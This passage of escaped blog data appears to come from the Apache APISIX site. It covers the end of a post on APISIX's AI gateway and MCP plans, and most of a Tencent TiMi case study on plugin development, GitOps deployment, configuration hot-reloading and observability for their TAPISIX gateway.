gateway is that when using AI services\u2014whether from public clouds or private large model instances\u2014they must achieve unified access control, security auditing, and cost management.\\n\\nSome may question: If one is simply making simple calls through public services like ChatGPT, is it still necessary to deploy an AI gateway? The answer is yes. Take the confidential information leak incident at Samsung as an example. One of the root causes was the lack of a unified mechanism for recording content submission and response processes. **An AI gateway can provide a unified entry point for content transmission within enterprises, ensuring all requests and responses are traceable and auditable, thereby safeguarding data security.**\\n\\nDuring the use of AI services, enterprises should centralize the recording of content submission and responses at the company level. Additionally, if there are uncontrollable factors in costs, corresponding recording mechanisms should be established. These measures fall under the scope of unified company-level security auditing and cost control.\\n\\nTraditional enterprises might think that purchasing a user account allows direct use of AI services without the need to build any internal infrastructure. However, this is not the case. The emergence of AI gateways is precisely to address this change. Whether enterprises use AI products provided by public clouds or multiple private large model instances deployed internally, they must access and manage them through an AI gateway.\\n\\n**AI gateways primarily address security concerns, followed by auditing issues, and finally typical application scenarios.** Currently, commercial customers are mainly focused on realizing these key scenarios.\\n\\n![Using Scenarios of AI Gateway](https://static.api7.ai/uploads/2025/05/30/t8hVlxmy_4-typical-use-cases-of-ai-gateway.webp)\\n\\n## APISIX AI Gateway\\n\\nNext, we will introduce the basic implementation methods of the APISIX AI gateway. The technical changes involved in this implementation are relatively minor compared to previous builds, such as the Ingress Controller. This is because in APISIX, the API gateway and AI gateway have already been integrated, and everything operates within a unified framework.\\n\\n![APISIX AI Gateway](https://static.api7.ai/uploads/2025/05/30/ulR1vr00_5-ai-gateway-architecture-1.webp)\\n\\nFrom an architectural perspective, the AI gateway shares essentially the same structure as the API gateway, with only slight adjustments in language extensibility or integration methods. Previously, the plugin system already supported multi-language and replica plugins. Now, the AI gateway is supported in the same plugin framework and still takes the form of plugins. The core design principles remain fundamentally unchanged\u2014only a few critical modifications and upgrades have been made at the underlying level, which have already achieved the desired results.\\n\\n![APISIX AI Gateway Architecture](https://static.api7.ai/uploads/2025/05/30/r2pEsY9s_6-ai-gateway-architecture-2.webp)\\n\\n### Technical Innovations of APISIX AI Gateway\\n\\nThe main technical challenges or distinctions in implementing the AI gateway within APISIX lie in its differences from traditional HTTP inbound traffic. One primary distinction is the load balancing mechanism for large model instances, which differs from traditional upstream node load balancing. For example, health check methods are different: traditional methods use HTTP GET, while AI gateways require the POST method, changing the invocation approach. Additionally, retry and circuit-breaking strategies also vary.\\n\\nIn terms of observability, the AI gateway focuses on two core metrics: token recording during request and response processes, and latency-related indicators, particularly first-response latency and the number of concurrent connections waiting for the first response. Another factor is cost control. In fact, costs can be quantified in most scenarios by the number of tokens in requests and responses. Security is also a key challenge, which is consistent in the open-source or commercial versions of APISIX.\\n\\n**Currently, we have supported DeepSeek, OpenAI, Qwen, and OpenAI-Compatible in both open-source and commercial versions.** The reason for supporting the compatible mode is that there are far more enterprises providing large model services than the aforementioned DeepSeek. Some companies provide private large model services exclusively for commercial enterprises. Although these service providers are not among the three mentioned above, their external interfaces adhere to OpenAI\'s specifications, thus falling under the \\"OpenAI Compatible\\" category.\\n\\n![Supported LLMs in APISIX AI Gateway](https://static.api7.ai/uploads/2025/05/30/VjLe1eyF_7-ai-gateway-technical-updates.webp)\\n\\n### APISIX AI Gateway Plugin Overview\\n\\nThe APISIX AI gateway has the following commonly used plugins. In terms of proxy, we have not adopted the standard upstream mechanism but instead implemented dynamic proxy through the `ai-proxy` plugin.\\n\\n![APISIX AI Gateway Plugins](https://static.api7.ai/uploads/2025/05/30/wWMVaORL_8-apisix-ai-gateway-plugins.webp)\\n\\n`ai-proxy-multi` refers to load balancing across multiple large models. `ai-proxy` and `ai-proxy-multi` are plugins specifically designed for proxy functions. In addition to proxy capabilities, it is also necessary to implement token-level traffic throttling and health checks for certain upstream services, such as determining whether their tokens are exhausted, which is a common practice.\\n\\nFor a company looking to centrally manage and record AI requests within the organization, it typically only needs to focus on the following four types of services:\\n\\n1. AI request proxy;\\n\\n2. Token-level traffic throttling and speed limiting;\\n\\n3. Content compliance review, especially regarding data leakage issues;\\n\\n4. Security review and recording of requests.\\n\\nRegarding content compliance review, as long as traffic travels over the public network, the requirement extends beyond the enterprise level to national-level regulation. APISIX is initially adapted to AWS-related services to support overseas demands, and other aspects can be researched independently as needed. For instance, in the context of prompt protection: some malicious information may consist of individual \\"clean\\" words, but when combined, they can form offensive content. Such issues are difficult to identify through simple means in natural language, thus requiring more efficient mechanisms to explicitly allow or block textual content.\\n\\nCurrently, 90% of the core features have been completed, with the remaining part being personalized add-ons. Like APISIX, the APISIX AI Gateway remains 100% open-source and ready-to-use out of the box. The following figure illustrates the application scenario of the AI gateway proxy for large model invocation.\\n\\n![AI Gateway Use Cases](https://static.api7.ai/uploads/2025/05/30/QhrQ5lMR_9-apisix-ai-gateway-features.webp)\\n\\n### Example in Intelligent Manufacturing Enterprise\\n\\nTake a leading enterprise in the intelligent manufacturing industry as an example. Its usage scenarios mainly include two aspects: one is for internal use or its B-end customers, and the other is for some C-end users. The large models accessed by the enterprise involve Qwen, DeepSeek, and various large language model services, including open-source GPT-like models and products from cloud service providers such as Alibaba. The deployment methods also encompass a hybrid of private deployment and online cloud services. Furthermore, the use of models is not limited to text-to-text generation but also includes multimodal scenarios such as text-to-speech and text-to-video, involving a more diverse range of suppliers.\\n\\n![Use Case of AI Gateway](https://static.api7.ai/uploads/2025/05/30/yPkcGq2v_10-smart-manufacturing-use-case.webp)\\n\\nFor the enterprise, establishing a unified entry point for requests is particularly crucial. From the client\'s perspective, the goal is to abstract away the underlying implementation details, so they are not explicitly aware of which service provider\'s model is being invoked. For example, users only need to ask a question, and the system will automatically route it to the most suitable model. Once users receive a satisfactory response, they typically prefer to continue using the same model rather than switching to a different one.\\n\\nTherefore, it is necessary to mask the number of internal deployments while reasonably balancing system pressure and achieving internal and external isolation. This is one of the most basic and common capabilities. When internal failures occur, such as large models being unable to continue providing services due to exhausted machine resources, unhealthy nodes should be promptly taken offline.\\n\\nIn terms of compliance, the To B scenario usually poses no significant issues. However, for company-internal To C traffic, there are stringent regulatory requirements at the national level, making security audits particularly important. In the context of large model invocation, i.e., AI request scenarios, the primary requirement in actual use is to record the content of every request and response, which has become a rigid demand. Secondary requirements include token-level quota and speed limiting, automatic forwarding, transparent proxying, and ROI cost-related metrics.\\n\\nFinally, regarding observability metrics, such as determining which large model responds faster and more stably, the gateway can more effectively direct traffic to the better-performing model services. However, there are many factors to consider, and the model with the fastest response is not necessarily prioritized for more traffic allocation.\\n\\nIn large model services, pricing is a key factor. Different model services have significant pricing differences. Therefore, the various optimization metrics mentioned earlier require more robust observability capabilities to support them. Traditional proxy services may only focus on whether a request is successful, such as judging the result based on HTTP status codes like `200`, `300`, or `500`. However, in the context of large models, it is necessary to introduce more granular token-related metrics to truly achieve effective optimization and cost control.\\n\\n## Future Plans for AI Gateway and MCP Server\\n\\nRegarding MCP Server, all the aforementioned features have already been covered in [APISIX-MCP](https://github.com/api7/apisix-mcp). Although MCP has not yet officially become an industry standard, it has been widely recognized and actively followed by numerous enterprises. From the trend, MCP is very likely to become a standardized bridge connecting AI models and traditional APIs in the future.\\n\\n### The Application Scenarios and Value of MCP in APISIX\\n\\nAPISIX-MCP can only operate in local environments and lacks unified interfaces for enterprise-level scenarios. However, enterprise users\' demands for AI are not \\"individual-level invocations\\" but \\"service-level integration.\\" They hope to achieve cross-system linkage through wearable devices, smart terminals, or other system interfaces, such as \\"placing a coffee order by voice.\\" This is clearly impossible to achieve through individual local deployments. Therefore, the unified exposure of enterprise-level API interfaces becomes particularly critical.\\n\\nAPISIX can help users more conveniently access AI chatbot services built on standard input/output. It standardizes and encapsulates MCP\'s communication capabilities, exposing them through the gateway as unified interfaces. This enables AI services that were originally only usable locally to be shared and uniformly invoked at the company level. This not only addresses service exposure issues but also lays the foundation for further governance capabilities such as security policies, access control, and content review.\\n\\n### The Current Stage and Future Development of APISIX-MCP\\n\\nCurrently, MCP has completed the initial stage within the APISIX community, achieving standard input/output service integration. To truly build a service proxy gateway system based on the MCP protocol, ongoing investment from the community and enterprises is still required.\\n\\nMoreover, MCP differs significantly from traditional HTTP APIs. Although it still falls within the realm of request-response communication, its interaction model is closer to AI model invocation, featuring prompt injection and context passing capabilities. Therefore, it is distinct from generic HTTP interfaces and existing conversational AI APIs, representing a new generation of communication protocols better suited to AI applications.\\n\\nAt present, we are conducting in-depth research on MCP and plan to promote its implementation within enterprises in the near future. From a technical perspective, MCP holds significant potential as a standardized bridge between traditional applications and AI models. Our goal is to encapsulate existing HTTP APIs through APISIX into MCP interfaces, enabling flexible invocation within AI-driven systems. By configuring APISIX with necessary settings, such as importing OpenAPI description files, existing HTTP interfaces can be incorporated into gateway management.\\n\\nHow to transform existing HTTP interfaces into interfaces compliant with the MCP model currently relies on developer intervention, such as writing TypeScript or Python scripts. However, the method I mentioned earlier requires no additional development work. Instead, it can be achieved through appropriate configuration. Once configured, traditional APIs can be exposed in the MCP format and connected with our existing large model services to achieve synergy. This approach allows for the more efficient integration of existing HTTP APIs into our AI ecosystem.\\n\\n![Outlook for APISIX AI Gateway](https://static.api7.ai/uploads/2025/05/30/kTOfDEob_11-building-the-community.webp)\\n\\nAt the same time, issues related to governance, observability, and security must also be taken into account to achieve a unified management and control mechanism. For enterprises, the challenge is not merely about exposing interfaces externally, but more importantly about ensuring unified management, secure control, and compliance requirements.\\n\\nThe core capabilities of MCP have already been made available. We welcome everyone to try them out and share feedback on any potential shortcomings. This feature is still undergoing continuous iteration and will be open to the community once it reaches a certain level of stability and quality."},{"id":"APISIX Gateway Practices in Tencent Games","metadata":{"permalink":"/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi","source":"@site/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi.md","title":"APISIX Gateway Practices in Tencent Games","description":"Tencent Timi Studio Group developed TAPISIX based on APISIX, exploring gateway extension, deployment, and operations.","date":"2025-05-07T00:00:00.000Z","formattedDate":"May 7, 2025","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":18.09,"truncated":true,"authors":[{"name":"Zemiao Yang","title":"Author"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"APISIX AI Gateway: From Cloud-Native to AI-Native","permalink":"/blog/2025/05/29/apisix-ai-gateway-from-cloud-native-to-ai-native"},"nextItem":{"title":"2025 Monthly Report (April 01 - April 30)","permalink":"/blog/2025/04/30/2025-april-monthly-report"}},"content":"> Authors: Zemiao Yang, Backend Development Engineer at Tencent Timi Studio Group. This article is based on his presentation at the APISIX Shenzhen Meetup on April 12, 2025.\\n\x3c!--truncate--\x3e\\n\\n## About Timi Studio Group\\n\\nTiMi is a subsidiary of Tencent Games and the developer of several popular mobile games, including *Call of Duty: Mobile*, *Pok\xe9mon Unite*, *Arena of Valor*, and *Honor of Kings*.\\n\\n*Honor of Kings* is one of the world\'s most popular MOBA mobile games. As of December 2023, it has recorded up to 160 million daily active users, 3 million concurrent online users, over 3.8 billion downloads, and over 300 million registered users. In May 2017, it topped the global mobile game revenue chart. (Source: Wikipedia)\\n\\n## TAPISIX API Gateway\\n\\nOur team primarily uses the Golang language for development and also takes on some operational responsibilities. Given our limited experience in operations and our desire to control costs, we aim to unify the handling of multiple tasks such as authentication and traffic recording through an API gateway. Additionally, due to the frequent infrastructure migration required for our overseas business, we cannot rely on cloud-based solutions and require all data and components to be migratable.\\n\\n### Introduction to TAPISIX\\n\\nAlthough Apache APISIX is fully open-source with a rich plugin ecosystem, we need to balance the integration with existing infrastructure, such as internal service discovery, log standards, and trace reporting. These functions are company-specific and cannot be directly merged into the open-source upstream. Therefore, we have developed a customized version, TAPISIX, based on APISIX, adding a series of plugins designed for our internal environment.\\n\\nOur services run on Kubernetes (k8s) clusters, with APISIX serving as the traffic entry point and connecting to internal business services. Service discovery utilizes the company\'s internal Polaris system, metric monitoring is achieved through the Prometheus provided by APISIX, and log and trace collection are performed via OpenTelemetry and ClickHouse. For CI tools, we use OCI (similar to GitHub Actions), which supports pipeline definition through YAML; for CD tools, we select Argo CD, which implements continuous deployment based on open-source solutions.\\n\\nDue to the stringent compliance requirements of our overseas business, many internal company components cannot be directly implemented.\\n\\n![TAPISIX Gateway Architecture](https://static.api7.ai/uploads/2025/05/15/jnAmJchc_timi-1.webp)\\n\\nThis presentation will cover the following four aspects:\\n\\n1. Gateway Feature Extension: How to extend gateway features based on business needs.\\n2. Deployment and Operations: Practices for gateway deployment and daily operations.\\n3. Runtime Operations: Maintenance and optimization of the runtime environment.\\n4. Other Experiences: Practical experience accumulated by the team in gateway operations.\\n\\n## Gateway Feature Extension\\n\\n### Goals and Challenges\\n\\nOur goal is to build a business-targeted gateway that leverages APISIX\'s plugins to meet customized requirements. As a business-oriented team, we face the following challenges:\\n\\n1. High Development Threshold: Frontline developers are familiar with Golang but lack familiarity with the Lua language and APISIX plugin development, leading to a high learning curve.\\n\\n2. Plugin Reliability: Ensuring that developed plugins can be safely and stably deployed.\\n\\n#### Core Issues\\n\\n1. How to reduce the development threshold?\\n2. How to quickly verify plugin functionality?\\n3. How to ensure plugin reliability?\\n\\n#### Solutions\\n\\nTo address the above issues, we have taken the following four approaches:\\n\\n1. Development Standards (Maintainability)\\n2. Local Quick Running and Testing\\n3. Pipeline Construction (Build Process)\\n4. Reliability Assurance\\n\\n### 1. Development Standards\\n\\nDevelopment standards are easy to understand. We need to define a library, specify the storage path for plugins, and require plugins to adopt a single-file format, consistent with APISIX\'s single-file plugin mechanism, to facilitate management and maintenance.\\n\\nTo lower the development threshold, we support local quick running and testing. By utilizing APISIX\'s Docker image, local plugins can be mounted into containers via volume mapping for convenient deployment. Additionally, by leveraging the downstream echo-service (a service developed based on open-source Node.js), upstream behavior can be simulated. This service can return all content of a request, such as request headers. By adding specific parameters in the request (e.g., HTTP status code `500`), upstream exceptional behavior can be simulated, thereby comprehensively verifying plugin functionality.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Honor Plugin Ecosystem\\" src=\\"https://static.api7.ai/uploads/2025/05/15/1r4TMUK9_timi-2.webp\\" />\\n</p>\\n\\n### 2. Local Quick Running and Testing\\n\\nTo reduce the development threshold and accelerate verification, we provide convenient local development environment support:\\n\\n1. **File Mapping**: By mounting local plugin files into Docker containers, developers can test plugin changes in real-time.\\n\\n2. **Makefile Build**: Construct a Makefile to support quick startup of the plugin testing environment via the `make run-dev` command, ensuring seamless connection between local files and containers.\\n\\n3. **Direct Browser Access**: Developers can directly verify plugin functionality by accessing relevant interfaces in a browser, without additional deployment or configuration.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Honor Plugin Ecosystem\\" src=\\"https://static.api7.ai/uploads/2025/05/15/bdMFTb0b_timi-3.webp\\" />\\n</p>\\n\\nBy defining development standards and providing local quick development support, we have effectively lowered the development threshold and accelerated the plugin verification process. Developers can focus on feature implementation without worrying about complex deployment and testing procedures, thereby improving overall development efficiency.\\n\\n### 3. Pipeline Construction (Build Process)\\n\\nDuring pipeline construction, it is essential to ensure reliability and stability in plugin development. The development process is as follows:\\n\\n1. Branch Management and Pull Request (PR) Process:\\n\\n    a. Developers create a new branch from the master branch for development.\\n\\n    b. After completing development, they submit a PR to the master branch.\\n\\n2. Webhook Triggering: After submitting a PR, the system automatically triggers a Webhook to start the pipeline.\\n\\n3. Pipeline Inspection:\\n\\n    a. Lint Check: Primarily checks code formatting standards.\\n\\n    b. Unit Testing: Runs unit tests to verify whether plugin functionality meets expectations.\\n\\n    c. Try Build: Constructs an image using the source code to verify its buildability.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Pipeline Building\\" src=\\"https://static.api7.ai/uploads/2025/05/15/VAFUteFJ_timi-4.webp\\" />\\n</p>\\n\\n### 4. Reliability Assurance (CR, lint, unit testing, black-box testing)\\n\\nWe utilize the k6 testing framework from Grafana to validate core test cases. The k6 framework supports writing test case declaratively and covers various scenarios. We regularly replay these test cases to check interface functionality. For instance, even if only a plugin is modified, we conduct comprehensive replay testing, including parsing and service discovery.\\n\\n#### Core Test Cases and the k6 Testing Framework\\n\\nk6 Test Cases: Comprising hundreds of test cases covering core processes to ensure plugin reliability.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"K6 Test\\" src=\\"https://static.api7.ai/uploads/2025/05/15/80NTJpcY_timi-5.webp\\" />\\n</p>\\n\\nThrough the complete process of local development, quick validation, MR submission, pipeline inspection, reliability assurance, and packaging deployment, we ensure that every stage of plugin development and deployment undergoes strict quality control.\\n\\n![Gateway Development Workflow](https://static.api7.ai/uploads/2025/05/15/0sIEPiql_timi-6.webp)\\n\\n## Deployment and Operations\\n\\nNext, we briefly introduce the deployment modes of APISIX, which are divided into the data plane and control plane. The data plane is responsible for proxy, while the control plane manages configurations, including the management interface and other functionalities, writing configurations to etcd. The data plane reads configurations from etcd and loads them into memory to complete routing functions.\\n\\nAPISIX offers three deployment methods to accommodate the needs of different production environments:\\n\\n1. **Traditional Mode**: The data plane and control plane are deployed within a single instance.\\n\\n2. **Separated Mode**: The data plane and control plane are deployed independently. Even if the data plane fails, the control plane can still operate and make modifications.\\n\\n3. **Standalone Mode**: Only the data plane is deployed, with configurations loaded from local YAML files, eliminating dependence on etcd.\\n\\nWe utilize the standalone mode that retains only the data plane. All configurations are stored locally, avoiding reliance on etcd. This mode is more suitable for overseas scenarios. Since etcd is a database, some cloud providers do not offer etcd services. Given the stringent overseas data compliance requirements and our k8s-based deployment environment, we have also implemented a configuration management approach that is k8s-friendly.\\n\\n<p align=\\"center\\">\\n  <img width=\\"650\\" alt=\\"APISIX Deployment\\" src=\\"https://static.api7.ai/uploads/2025/05/07/99nRuGCG_7-dp-and-cp.webp\\" />\\n</p>\\n\\n- YAML Configuration: All configurations are directly stored in YAML files for easy management and automated deployment.\\n- ConfigMap Storage: YAML files are directly placed in k8s ConfigMaps to ensure configuration versioning and traceability.\\n\\nWe define the gateway as immutable infrastructure, with infrequent changes during daily operations. Even route changes are considered as change operations.\\n\\n### Kubernetes Configuration Management and Deployment Practices\\n\\n**Backgrounds and Challenges**\\n\\nWhen managing config.yaml, we found that Kubernetes deployments actually rely on a series of complex configuration files, such as Service.yaml, ConfigMap.yaml, and Workload. These numerous and detailed configuration files can lead to complex management and potential errors.\\n\\n**Solution**\\n\\nThe Kubernetes community proposes Helm Charts as a solution. Helm Charts template Kubernetes configuration files, significantly simplifying configuration management. The official APISIX Helm Chart enables us to efficiently manage core configurations (e.g., node counts) without manually filling out numerous YAML files. Currently, Helm Charts have effectively addressed the issue of configuration complexity.\\n\\n**Follow-up Problem**\\n\\nHowever, a key follow-up issue arises: how to deploy Helm Charts or YAML files to a Kubernetes cluster.\\n\\n**Solution**\\n\\nTo address this, we adopted the GitOps model, deploying YAML files to a Kubernetes cluster via pipelines. Under the GitOps model, all configurations are stored in Git as code. By triggering CI/CD processes via Git, we achieve automated deployment. Both `config.yaml` and other configuration files are stored in Git, ensuring versioned management and traceability of configurations. This approach not only simplifies configuration management but also automates and standardizes the deployment process, enhancing overall efficiency and reliability.\\n\\n### Deployment Process Example\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Deployment Workflow\\" src=\\"https://static.api7.ai/uploads/2025/05/15/S2R27TnZ_timi-8.webp\\" />\\n</p>\\n\\nIn the deployment process illustrated above, SREs (Site Reliability Engineers) manage configurations on behalf of users. Any modifications, such as route changes or image updates, must be implemented by altering the Helm Chart repository. After the change, Argo CD automatically detects it and triggers the pipeline to pull the latest configuration for deployment. Additionally, a strong synchronization is established between Git and Kubernetes, ensuring configuration consistency and reliability.\\n\\nFor instance, after deployment, if I have full access to the k8s cluster and modify the `service.yaml` file, Argo CD continuously monitors the cluster status. If it detects discrepancies between actual resources and the configurations in the Git repository, it automatically triggers synchronization, overriding the cluster configuration with the content from the Git repository.\\n\\n### Advantages of GitOps\\n\\nThis management model offers numerous benefits:\\n\\n- **Configuration Consistency**: All configuration changes are made through Git, ensuring system configuration consistency.\\n- **Security**: Reduces the risk of manual modifications, with all changes traceable.\\n- **Automated Deployment**: Achieves automated deployment and canary releases based on version changes in Argo CD or Git.\\n\\nIn deployment, we only need to maintain two repositories: the code repository (for application code) and the deployment repository (for all deployment-related configuration files). This simplified model renders many traditional management platforms unnecessary, making the entire process more efficient and streamlined. When deploying applications to other clusters, simply pull the corresponding branch from the deployment repository and apply it to the target cluster. The entire process is simple and efficient.\\n\\n![GitOps Advantages](https://static.api7.ai/uploads/2025/05/15/20UakpGY_timi-9.webp)\\n\\nIn our deployment practices, key APISIX configuration files (e.g., routing configurations and `config.yaml` startup configurations) are integrated into a single Helm Chart repository for unified management and deployment. However, this deployment approach may also present an issue: it essentially treats APISIX as a regular service for deployment.\\n\\n## Why Not Use the APISIX Ingress Controller?\\n\\n![APISIX Ingress Controller Wrkflow](https://static.api7.ai/uploads/2025/05/07/7WnT5rWl_10-ingress-controller.webp)\\n\\nThe APISIX Ingress Controller, as the official community solution for k8s, follows this core process: By defining custom resources such as APISIXRoute, routing and other configurations are described in YAML files within k8s.\\n\\nAfter deploying these CRDs to the k8s cluster, the Ingress Controller continuously monitors the relevant CRD resources. It parses the configuration information from the CRDs and synchronizes the configurations to APISIX by invoking APISIX\'s Admin API. The Ingress Controller primarily facilitates deployment between CRDs and APISIX, ultimately writing data to etcd.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"APISIX Ingress Controller\\" src=\\"https://static.api7.ai/uploads/2025/05/07/XbjN7Bky_11-ingress-controller.webp\\" />\\n</p>\\n\\nAfter careful evaluation, we found that the deployment and operational model of the APISIX Ingress Controller does not fully align with our team\'s requirements for the following reasons:\\n\\n1. **Business-Oriented Gateway Positioning**: As a business-oriented gateway, we focus on reducing development and operational thresholds to enhance usability and development efficiency.\\n\\n2. **Operational Cost**: Introducing the Ingress Controller adds an extra layer of operational complexity. It requires deep integration with k8s, involving additional Golang code and k8s API calls, which increases operational difficulty and cost.\\n\\n3. **Environment Consistency**: Due to reliance on the k8s environment, discrepancies between local development and online deployment environments may lead to inconsistencies such as \\"works locally but fails online,\\" complicating fault diagnosis and resolution.\\n\\n4. **Version Coupling**: There is a strong coupling between APISIX and Ingress Controller versions. Since our APISIX is a customized version, we only maintain compatibility with specific versions. This may result in unsupported APIs or compatibility issues, affecting system stability and reliability.\\n\\n5. **Configuration Opacity**: With the Ingress Controller approach, the final configurations still need to be written to etcd, which may cause inconsistent configuration states. For example, Ingress Controller monitoring failures or poor etcd status may trigger issues like excessive connections, making the entire architecture chain more opaque and complex. In contrast, Helm Charts offers a comprehensive and auditable YAML file containing all routing configurations, making routing states clear and visible.\\n\\nFor these reasons, we opted not to use the APISIX Ingress Controller.\\n\\n### How to Achieve Hot Reloading of Configurations?\\n\\nWhen deploying APISIX in a k8s environment, hot configuration updates are crucial for ensuring system stability and availability. APISIX configurations are primarily divided into two categories:\\n\\n1. **APISIX Routing Configuration** (`apisix.yaml`): Uses traditional loading methods to define routing configurations, including upstream routing and corresponding forwarding rules.\\n\\n2. **Startup Configuration** (`config.yaml`): Serves as the startup configuration file, specifying key parameters such as the APISIX runtime port. Changes to certain configuration items require a service restart to take effect.\\n\\n![Hot Reloading](https://static.api7.ai/uploads/2025/05/15/HBe8lFgq_timi-12.webp)\\n\\n### k8s Resource Deployment Process\\n\\n1. **Modify Git configuration**: Make changes to the aforementioned Git configurations.\\n2. **Deliver to Argo CD**: Submit the modified configurations to Argo CD.\\n3. **Generate resource files**: Based on the modified configurations, Argo CD generates corresponding resource files such as ConfigMap and Service YAML via the Helm Chart.\\n\\nIn the k8s environment, resources like `apisix.yaml` and `config.yaml` exist in the form of ConfigMaps.\\n\\n### APISIX Configuration Change Handling Mechanism\\n\\n**Backgrounds and Challenges**\\n\\nWhen APISIX-related configurations change, the corresponding ConfigMap is updated. However, the Deployment (i.e., the APISIX deployment instance) itself remains unchanged.\\n\\n**Solution**\\n\\nTo address this issue, the k8s community proposes a solution that involves splitting configurations and utilizing hash and annotation methods. The content of the ConfigMap that needs to be changed is injected into the Deployment as annotations, thereby achieving dynamic configuration updates.\\n\\n- `apisix-configmap.yaml`: Primarily stores APISIX\'s core configurations, such as routing rules. When this type of ConfigMap is modified, due to the built-in timer mechanism in APISIX, it periodically reads and updates the in-memory configuration information from the local file. Therefore, the APISIX service does not need to be restarted for the configuration to take effect.\\n\\n- `config-configmap.yaml`: Mainly includes basic configurations such as the APISIX runtime environment. When this type of ConfigMap is modified, as it involves the basic runtime environment settings of the APISIX service, a restart of the APISIX deployment instance is required to ensure the new configurations are correctly loaded and applied.\\n\\n**Update Trigger Mechanism**\\n\\nTo automatically detect configuration changes and trigger the update process, we annotate the ConfigMap content with a hash and write the hash value into the `deployment.yaml` file. When configuration changes cause the hash value to update, the `deployment.yaml` file also changes. The k8s system detects this change and automatically triggers the update process, ensuring that the APISIX deployment instance promptly applies the new configurations.\\n\\n![Hot Reloading](https://static.api7.ai/uploads/2025/05/15/TQVZcDbl_timi-13.webp)\\n\\n## Runtime Operations\\n\\nRuntime operations are primarily divided into three parts: metrics collection, trace reporting, and log collection.\\n\\n![Runtime Operation](https://static.api7.ai/uploads/2025/05/15/bYcxhAf1_timi-14.webp)\\n\\n### 1. Metrics Collection\\n\\nk8s clusters offer an official metrics collection solution called the Kubernetes Prometheus Operator. By periodically scraping metrics ports and information exposed by services, data is regularly reported to external systems such as Prometheus. Since this part has not been deeply customized, it will not be detailed here. Related k8s configurations are fully described in APISIX\'s Helm Chart.\\n\\n![Metrics](https://static.api7.ai/uploads/2025/05/15/HWY7oK1j_timi-15.webp)\\n\\n### 2. Trace Reporting\\n\\nTrace reporting is implemented based on the OpenTelemetry plugin provided by APISIX. This plugin sends data to the OpenTelemetry Collector via the OpenTelemetry protocol, which ultimately writes the data to ClickHouse for trace data collection and storage.\\n\\n![Trace](https://static.api7.ai/uploads/2025/05/15/aHPC3JJa_timi-16.webp)\\n\\n### 3. Log Collection\\n\\nLog collection also utilizes the OpenTelemetry protocol. However, the OpenTelemetry plugin in the APISIX community edition only supports trace reporting and does not include log reporting. Therefore, we recommend using local log storage. By employing a sidecar mode, APISIX logs are written to a shared folder. In the Deployment, another Pod is mounted, which shares the same log folder as the APISIX Pod, thereby achieving log collection and reporting via the OpenTelemetry protocol.\\n\\n![Log](https://static.api7.ai/uploads/2025/05/15/fKomicyg_timi-17.webp)\\n\\nAdditionally, the monitoring dashboard provided by APISIX are relatively general-purpose and lack specificity. Therefore, we have custom-developed dedicated monitoring panels based on the collected metric data to meet specific monitoring requirements. The alerting system is built using Grafana\'s open-source solution, leveraging its powerful visualization and alerting capabilities to achieve real-time monitoring and alerting of APISIX\'s operational status.\\n\\n![Monitoring and Alerting](https://static.api7.ai/uploads/2025/05/15/nMkIzdmq_timi-18.webp)\\n\\n## Other Experiences\\n\\n### Standalone Route Management\\n\\nIn our initial approach to route management, we consolidated all route configurations into a single YAML file. However, as our business expanded and the number of routes increased, this monolithic configuration became unwieldy and challenging to maintain. This scenario is humorously encapsulated in the industry jest that Kubernetes operations engineers are essentially \\"YAML engineers,\\" highlighting the overwhelming nature of managing extensive YAML configurations.\\n\\nTo address these challenges, we implemented a two-pronged strategy to optimize our route management:\\n\\n- Modular Decomposition: Following APISIX\'s routing specifications, we segmented the configurations into collector and consumer configuration modules, achieving functional decoupling and categorized management.\\n\\n- Domain-Based Segmentation: We further refined our route files by organizing them based on domain names, making route configurations more refined and organized for easier maintenance and expansion.\\n\\n![Standalone Route Management](https://static.api7.ai/uploads/2025/05/15/eQ80I0SA_timi-19.webp)\\n\\n### Reuse of Route Configurations\\n\\nIn k8s upstream configurations, there are various types, differed solely by the service name. After introducing a new version and updating the Lua package, we effectively addressed the issue of duplicated configurations by fully utilizing leveraged YAML\'s anchor (&) and alias (*) features. Through the anchor mechanism, we abstracted and reused common configuration parts, reducing duplicated configurations by approximately 70% in practical applications. This significantly improved the efficiency and simplicity of configuration management and reduced the risk of errors introduced by duplicated configurations.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Duplicated Route Configuration\\" src=\\"https://static.api7.ai/uploads/2025/05/07/hbEPdHAf_20-duplicated-route-configuration.webp\\" />\\n</p>\\n\\n## Migration Practices of APISIX Replacing Ingress\\n\\n### Initial Architecture and Background\\n\\nOur original traffic architecture was structured as follows:\\n\\n1. EdgeOne served as the Content Delivery Network (CDN), handling initial traffic ingress.\\n2. Traffic was then forwarded by Cloud Load Balancer (CLB) to the Ingress layer, which utilized Istio.\\n3. Finally, requests reached the internal APISIX gateway for processing.\\n\\nThe inclusion of the Ingress layer, specifically Istio, was primarily due to historical decisions. At the time, Istio was selected as the service mesh solution in our cloud environment.\\n\\nHowever, as our business evolved and technology advanced, we recognized the need for a more efficient and flexible traffic management system. Consequently, we plan to replace the existing Ingress layer with APISIX, leveraging it as the Kubernetes Ingress Controller.\\n\\n![APISIX Replaces Ingress](https://static.api7.ai/uploads/2025/05/15/68MNH7c5_timi-21.webp)\\n\\n### Migration Solution Evaluation\\n\\nDuring the migration process, we evaluated two primary migration solutions:\\n\\n- **Solution One: CDN Canary and Dual Domains** \u2013 Deploy a new APISIX instance alongside the existing architecture to direct new traffic to this instance. However, this solution\'s drawback is the need to modify the front-end domain, which may impact user access and business continuity. After careful consideration, we temporarily set aside this solution.\\n\\n- **Solution Two: CDN Traffic Steering** \u2013 This approach allows configuring multiple CLB routes and achieving traffic push based on percentages. Its advantage lies in the ability to gradually switch traffic to the new APISIX instance without changing the user access entry point. Additionally, the traffic ratio can be flexibly adjusted based on actual conditions, facilitating observation and evaluation of the migration effects.\\n\\n![Migration 